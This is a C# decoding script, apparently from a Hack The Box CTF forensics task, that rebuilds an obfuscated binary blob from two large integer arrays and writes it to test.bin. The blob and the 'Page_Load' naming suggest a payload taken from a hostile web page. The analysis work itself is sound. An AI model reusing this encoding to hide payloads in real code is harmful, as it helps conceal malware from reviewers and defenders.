﻿using System;
using System.Collections;
using System.Reflection;

public class HelloWorld
{
    public static void Main(string[] args)
    {
        static void Page_Load()
        {
            ulong[] int_arr = { 37342, 815148223, 0, 0, 0, 0, 0, 1592110, 42787541166827, 21771418602998, 23873965190336, 23253624529980, 23050661453555, 6745706881845, 2097450356204, 0, 2449611524, 4556, 6888110383080, 50947542, 0, 101895082, 52170282390, 6368442, 0, 0, 6368442, 27806760551516, 50947544, 50947544, 199013, 0, 982630, 9055129, 0, 0, 149260, 0, 0, 0, 0, 0, 0, 99506, 0, 895562, 0, 1448700, 101895082, 6368442, 0, 20033388836026, 1236958, 203790165, 57315984, 0, 13355593088054, 316623837, 305685248, 70052869, 0, 13772955347179, 0, 0, 0, 4075828188, 36419531, 0, 0, 0, 0, 0, 0, 0, 684110, 2798968696, 17679342, 1463306266731, 2086811350776, 1640272406, 1587964812478, 10520100582073, 3413821117, 3547579227439, 840465793704, 23167703598681, 1968635376687, 33223213, 24008143669850, 4806216085412, 3550900469800, 3012354757034, 9185284635210, 2086811487594, 2094962903046, 3220728511720, 9187710439607, 45918000111121, 127381291, 2504393440169, 36682254682, 485, 2087137280285, 3413821109, 3547579239877, 840465793704, 23167703598681, 1968635376687, 33223213, 635857158852, 1676827001722, 850244413050, 3973093069255, 2086811549786, 3555730810213, 46335394211714, 23167735405718, 3558070764573, 12580909084, 1287982639722, 46506577950806, 12580945872, 522744, 52985467929, 583, 2504502114161, 37497415344, 485, 2087223590097, 0, 25345311030475, 20545641754274, 4266360, 241300318644, 1158394634822, 5773199, 23798647379627, 9645805824994, 80103213, 658672179798, 17245793440, 84170610, 2086811637049, 23190771995, 93773223, 6350990070259, 6559668015601, 26438702536, 23254903375787, 3554155092767, 3965756622570, 3679651363494, 1476287801742, 23797800378469, 116018068, 30514518287, 23254903378022, 2309385419696, 2086811786118, 2518069738090, 59869853967, 3973093070310, 2726859425287, 23797800378795, 9063793911151, 36220692676, 8355396791087, 2935435176827, 1474670429432, 37850963420, 67375618, 2086811574664, 24211956149904, 449991051110, 8359526911697, 3352806988616, 50959987, 21703501372224, 5667003666323, 13833541553484, 0, 10054352288261, 175756773, 1343344, 401647231, 17811738, 24082643023845, 30299856, 67929429131, 199013, 849371, 4278797, 1224373, 208681154439, 6482331, 70055347, 460219, 12438, 111945, 37315, 49753, 12438, 24876, 8151606623, 4890963974, 121459013330, 95376048840, 4891598376, 241287630696, 267377137749, 4895043828, 379049782686, 267378642791, 4896623523, 424698779778, 370905253431, 4896623541, 595882518926, 41582622061, 4892419417, 683104709692, 41584052473, 8162900834, 865700747982, 769525446971, 4902706003, 1001832528883, 950492780754, 4905467346, 1062154467439, 769528307795, 4907892850, 9, 815160662, 28530822196, 815173101, 8234197, 224169256777, 62767371146, 649686468447, 1569, 815285058, 105155725443, 6935386940183, 81517670784, 108661554, 22010668813, 1728, 8152017110, 2885700, 1630321384, 264927252579, 6828662, 2445482047, 528224121643, 13865853512, 90483144487, 34239844977, 33422159371, 298349511418, 57881282878, 52986326252, 338292483385, 66848634767, 72549709436, 419808947650, 26906931527, 52986400909, 90483841044, 99450981488, 111678602966, 520889367324, 26901682543, 150806737713, 732015978881, 26901682517, 163847703620, 804566073860, 148371778457, 170370904610, 929285854244, 167937935456, 7339070686, 1021399307615, 185057316879, 26901894211, 1044224104685, 195655064717, 26903361951, 1137152718718, 215219890798, 37501159294, 152436275317, 199014, 111678366535, 108462588, 6219, 0, 2624494, 0, 34236760257, 24876, 0, 9, 0, 21165205240486, 22832205735460, 22623511856279, 20905977793177, 16787728847599, 22630844993832, 21171720417173, 24288034864420, 24300262424205, 23040880569559, 13646975526404, 17376986819673, 14258195665009, 9599683683494, 24097228635762, 24297052278205, 23461493307388, 24717624248179, 22836939304269, 23045742876219, 22006387607701, 22004817735275, 23050559160448, 23461493310062, 24292948105510, 24495913670594, 22006428966069, 22003165063857, 94066293684, 23040880569559, 21584159784661, 23037498666893, 21171738834378, 22004817724440, 21171720417173, 22616946016607, 90022433110, 24275033626513, 23868974097685, 23040826339676, 70336271018, 17358379486213, 9698337081283, 23873965215229, 22206052715219, 23844265882770, 22845141857756, 22590863985303, 89185119189, 98956984015, 21494431100610, 21494542895655, 14041143482303, 20335266743978, 13981984184198, 20749320472747, 17320898141235, 16545463798681, 17419532581037, 23844265895015, 21170092808794, 20324765242574, 23258522161653, 23226721044013, 21171688488085, 24089170801523, 24084138301212, 13655023734604, 20749421111798, 13981955364752, 20741980842564, 17320898141235, 20324663261122, 24305152959930, 17112216886508, 20958001725139, 9688507526887, 20749319216476, 21160756920550, 14816539390114, 94066531267, 24077757121650, 16743401254137, 22806072904604, 20336979730331, 20336950661924, 13604434354021, 14649396190250, 9437297175327, 13619918251694, 13816378489267, 22003165062284, 23872331521114, 23884577590003, 20312174646457, 82689368830, 20745394278082, 22001420234854, 25544955228281, 22775703540757, 11366754367730, 10262223757260, 21165982389465, 94107739140, 24482536842901, 21162610112443, 21165151232426, 22616968368210, 25329851683693, 24300262424205, 24077612003739, 23040880569546, 23884473145098, 23870684976711, 17375297440073, 21770709157767, 16777141397965, 93251170823, 14019481413213, 14019481535262, 93251270329, 23872325204416, 21171675689516, 14894171093397, 15316424266714, 98998827350, 21166784252787, 20742146023321, 17320856708165, 23218368980706, 23045742876315, 20327977936753, 24274670612991, 22625953631247, 21494507995065, 23872306047875, 24092281599006, 94066393820, 21158664434004, 22008062432668, 23461493305156, 24509758266841, 23461493305156, 22828941968252, 17409741135849, 25318076273143, 21368068125901, 90022433110, 25338767442997, 22836940485962, 24092281599008, 23844266044809, 24301105682696, 23471188430662, 23471189873507, 20958928396561, 24289568341274, 16068766784179, 24077611891792, 21164371198337, 23040880569557, 24286398225035, 13981795531767, 14492249210141, 22625953631782, 21494507995065, 23880496026221, 22623511856273, 93283187602, 22828944631522, 9688507526887, 22006393740349, 22625953626243, 20296221821406, 14059446574564, 13863704864895, 23884472346765, 21157877956211, 1373633, 98635473549, 88853768493, 88038694896, 79071877853, 67659840032, 88038694896, 82332719514, 89669128163, 82332582699, 100264885855, 84777741292, 98635435235, 88038607828, 92929733494, 101896637611, 26085862863, 43746229249463, 33764988353326, 25608297690637, 6682310976359, 6054300259446, 1047573857144, 26094868679, 6680267114250, 1676014927329, 1272520100076, 3305321503, 6052571500472, 6684333713123, 1882298375400, 3577798073408, 1673617194820, 6066441931298, 6682015465157, 2921637748656, 1466522654015, 8570717245476, 828074652, 5757283922, 4359414596, 2922452932493, 836358037789, 1670366147103, 21091827018738, 930155633284, 3756362277646, 1263897278260, 4165323587, 3756362290082, 29528437163070, 2932992816577, 2922351036977, 6055921127279, 5854500159090, 3779406665632, 1067070962192, 6521298128, 208684686934, 23451721179686, 23454934471786, 23256865906152, 150305198, 0, 101895082, 0, 0, 150454458, 0, 22593357302953, 24087183785223, 22619225794369, 7929067762712, 12, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 815160662, 26711184882519, 0, 815160662, 26711185181040, 0, 815160662, 895562, 7910799, 0, 70103816972, 56247155419, 64398600342, 63583439682, 14, 815173048, 0, 0, 0, 24876, 0, 845808, 92929522045, 82332570261, 90484102255, 3261090430, 79072002237, 79071927613, 89669053537, 978192794824, 67658347413, 89668978908, 88038657575, 83147755794, 5472880, 39128308843, 79886391714, 1630868612, 88038657575, 93744732458, 91299300233, 89669053537, 398027, 57061258804, 70105073257, 85593299980, 20, 37497987518, 597050, 59506740794, 92929571805, 63583875025, 1256295, 94560005075, 77441519219, 91299349986, 92929571803, 93744732463, 88038694896, 1630818859, 83962804511, 90483666912, 85593287543, 1442870, 20380160888, 85593287535, 79071952488, 88038657575, 88853718738, 95375215468, 88853818246, 90484064937, 88038657583, 79071765914, 81516638421, 20, 65212865428, 95375041352, 82332296619, 90484139571, 37497987509, 37497987518, 6521981847, 93744906594, 88038570514, 82332296603, 90484139571, 37497987509, 37497987518, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 149260, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
            ulong[] int_arr_r = { 169589, 341464, 184, 64, 0, 0, 0, 230888, 338034, 184425, 91241, 31665, 127800, 77116, 14333, 36, 54784, 309564, 193504, 316371, 1536, 286358, 231368, 241144, 4, 4, 265720, 324560, 149792, 149792, 287836, 0, 289428, 164172, 0, 0, 154128, 0, 0, 0, 0, 0, 0, 324760, 0, 94912, 0, 11134, 278172, 237048, 0, 257528, 333398, 203892, 25792, 0, 248648, 191274, 132108, 145884, 0, 242020, 0, 0, 12096, 171544, 197504, 1, 0, 0, 0, 0, 0, 0, 292731, 200865, 37096, 206181, 62648, 144340, 320168, 340707, 147033, 22918, 275208, 74171, 150812, 294588, 62594, 261180, 281683, 80444, 135864, 118079, 314596, 129726, 167028, 105714, 306794, 242702, 219512, 324745, 155646, 155164, 148841, 275208, 74171, 150812, 294588, 136378, 51563, 208398, 290629, 122493, 277103, 12126, 101588, 189451, 189652, 115256, 323537, 61130, 207008, 256845, 39500, 135790, 341568, 331683, 138990, 0, 338509, 180023, 14523, 239348, 1544, 33172, 259688, 303321, 268989, 288210, 232320, 284568, 89046, 69559, 8116, 240078, 8300, 317024, 148580, 216693, 275777, 223129, 19833, 24429, 137609, 22174, 155016, 316006, 42777, 32331, 322563, 210312, 146497, 245878, 230543, 339376, 248596, 21073, 88759, 131391, 39000, 207978, 210643, 182153, 145132, 18575, 255184, 290560, 200297, 52496, 65537, 237544, 81802, 112448, 91732, 37476, 79231, 56256, 266600, 290404, 295367, 148308, 163903, 75828, 324859, 259524, 169253, 125900, 97169, 32435, 158285, 125897, 251793, 184661, 41737, 184914, 168661, 222950, 171748, 83631, 173558, 279246, 124027, 69898, 208458, 212647, 211490, 57557, 183857, 290386, 29072, 159231, 51938, 71984, 193323, 217934, 316260, 43595, 329246, 314661, 144116, 88478, 236056, 122057, 136433, 230332, 125852, 201617, 338360, 43350, 338250, 116185, 215064, 54609, 131584, 29352, 341308, 223496, 225102, 268208, 169953, 336709, 122440, 339926, 144809, 162912, 129059, 308877, 193285, 8749, 123114, 269521, 2659, 131553, 192929, 234439, 152985, 251789, 115103, 193415, 270153, 302918, 226334, 38925, 221341, 291404, 51313, 148767, 344578, 292001, 181888, 168261, 180497, 267814, 178289, 158861, 289990, 124860, 331109, 170162, 238866, 283606, 142127, 8225, 126264, 289886, 325093, 0, 321256, 2, 72748, 251792, 0, 234637, 196612, 168584, 55918, 226905, 1969, 344704, 11097, 91909, 52893, 572, 141116, 248087, 201918, 183473, 193005, 95739, 315632, 204985, 242989, 27557, 152724, 177646, 102867, 133986, 142940, 100585, 68817, 101264, 198361, 205916, 141148, 91139, 102972, 82207, 233248, 93194, 249793, 83761, 290106, 336661, 5443, 110136, 209199, 338409, 305343, 224677, 267142, 218933, 230497, 102147, 26119, 9419, 110617, 3641, 52394, 286838, 52182, 37686, 79045, 223676, 192808, 177649, 293577, 3465, 287503, 239104, 336324, 118577, 234624, 23226, 308786, 218402, 37686, 310732, 245596, 246242, 20137, 8116, 238884, 36343, 266572, 240361, 293115, 5439, 23618, 267284, 65444, 104645, 313449, 216970, 127785, 319221, 264521, 328420, 251685, 70965, 66324, 40631, 280009, 199744, 133121, 197629, 109376, 223820, 98808, 60125, 41362, 88996, 195864, 28709, 572, 198052, 161565, 345119, 8093, 89851, 149916, 286877, 337318, 262223, 186263, 260155, 302147, 9440, 339982, 71133, 326198, 89655, 103102, 71505, 276561, 100368, 164063, 83520, 160006, 293425, 40937, 216461, 40757, 277169, 334356, 12564, 69813, 81948, 104889, 138094, 129251, 149167, 209460, 189277, 105912, 114416, 283633, 231109, 77929, 42601, 203345, 60609, 48401, 148005, 97681, 237468, 203083, 132212, 204139, 41722, 293425, 278049, 177247, 152957, 272959, 8116, 252095, 316915, 81805, 332963, 12355, 289437, 273197, 109724, 127036, 127791, 183662, 336892, 220658, 249256, 195448, 35943, 128216, 20052, 127243, 198757, 255171, 330420, 136915, 136465, 272500, 197970, 156274, 239888, 316233, 286117, 106836, 165817, 329132, 322710, 171355, 11680, 295945, 295394, 40480, 234213, 40928, 251374, 328513, 240600, 333645, 29666, 56344, 113842, 10301, 320793, 213620, 285606, 329933, 213384, 97897, 189092, 115674, 298536, 343860, 167290, 180529, 135069, 286866, 113981, 196814, 264392, 259208, 89990, 66900, 30559, 0, 286342, 0, 0, 65016, 0, 106508, 59296, 240015, 97420, 58896, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 122056, 180228, 0, 122056, 94017, 0, 122056, 86712, 322028, 0, 93324, 268023, 101402, 75174, 343214, 313437, 0, 0, 63, 251796, 0, 273728, 340093, 2274, 104541, 186280, 274300, 169450, 97312, 60000, 243320, 277060, 257051, 5501, 146351, 199525, 245256, 258784, 256949, 131485, 175855, 97312, 230372, 216352, 249205, 235125, 303071, 169688, 79912, 315468, 47466, 123738, 176917, 108982, 32045, 137531, 213773, 305523, 183662, 100452, 226901, 56033, 222692, 11183, 131264, 232469, 111175, 257056, 266877, 318197, 286070, 125041, 247169, 193757, 326657, 171996, 55716, 305362, 25287, 119350, 262794, 169688, 84772, 316121, 205181, 45085, 119350, 262794, 169688, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 137744, 16224, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
            for (int i = 0; i < int_arr.Length; i++) int_arr[i] = (int_arr[i] * 345300 + int_arr_r[i]);
            byte[] a = new byte[int_arr.Length * 8];
            System.Buffer.BlockCopy(int_arr, 0, a, 0, a.Length);
            string filePath = "E:\\CTF\\HTB\\Window s Infinity Edge\\test.bin";
            File.WriteAllBytes(filePath, a);

        };
        Page_Load();
    }
}